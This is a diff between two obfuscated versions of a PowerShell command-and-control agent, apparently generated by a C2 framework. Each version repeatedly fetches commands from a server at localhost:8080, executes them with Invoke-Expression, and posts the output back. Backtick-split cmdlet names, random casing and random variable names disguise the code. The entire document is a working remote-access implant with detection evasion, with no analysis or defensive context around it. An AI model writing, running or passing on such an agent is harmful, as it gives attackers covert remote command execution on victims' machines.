@@ -1,37 +1,34 @@
 
-    $nitDUR = nEW-`OB`JECT miCRoSOft.PoWeRShELL.COMMANdS.WeBReqUeSTSESSiOn
-        $WgafJa = nEW-`OB`JECT SYStEM.NEt.cOOKIe     
-        $WgafJa.Name = "cGZUzf"
-        $WgafJa.Value = "4256"
-        $WgafJa.Domain = "localhost"
-        $nitDUR.COOkiEs.ADd($WgafJa);
-    funCTIOn TwFpTu {
+    $oaiyGO = n`EW-`oB`jEC`T micrOsoFt.POWershell.COmmanDs.webrEQuEstSeSSiON
+        $hnUHLR = n`EW-`oB`jEC`T SySTem.NET.cookIE     
         
-        $UiHbrh = INVOKE-WEBREqueST "http://localhost:8080/getcommand/EzuWsx" -WebseSsIoN $nitDUR 
-        return $UiHbrh.cOnTeNT 
+    FUNcTIOn gwMNwu {
+        
+        $FIqEIq = InVoke-weBrEQuest "http://localhost:8080/getcommand/ccEcQJ" -Headers @{"Authorization"="1332"}  
+        rEtURN $FIqEIq.CONTENT 
     }
-    funCTIOn ozzUoO([string]$kxLAHb){
-        $kxLAHb  =(iex $kxLAHb 2>&1 | Out-String )
-        return $kxLAHb
+    FUNcTIOn jpLOHE([string]$iSmtIW){
+        $iSmtIW  =(iex $iSmtIW 2>&1 | Out-String )
+        rEtURN $iSmtIW
     }
-    funCTIOn vnAarD([string]$command){
+    FUNcTIOn xCGGBI([string]$command){
     
 
-        $KiAuAs = @{VxAGeF=$command}
-        $req = INVOKE-WEBREqueST "http://localhost:8080/response/mskd" -WebseSsIoN $nitDUR -Method POST -Body $KiAuAs 
+        $OQVPJG = @{TawBIL=$command}
+        $req = InVoke-weBrEQuest "http://localhost:8080/response/mskd" -Headers @{"Authorization"="1332"} -Method POST -Body $OQVPJG 
     }
-    $tuSNjW = 1
+    $AFIboj = 1
     
-    WhILe ($tuSNjW -lE 5 -aNd $tuSNjW -nE 3)
+    WhiLe ($AFIboj -Le 5 -AND $AFIboj -nE 3)
     {
-        $kxLAHb = TwFpTu
-        if($kxLAHb.Trim() -eq "none"){
+        $iSmtIW = gwMNwu
+        if($iSmtIW.Trim() -Eq "none"){
         Start-S`lEep -s 1
     
         }
-        eLSE{
-        $kxLAHb = ozzUoO($kxLAHb)
-        vnAarD($kxLAHb)
+        ELSe{
+        $iSmtIW = jpLOHE($iSmtIW)
+        xCGGBI($iSmtIW)
     
         }
         
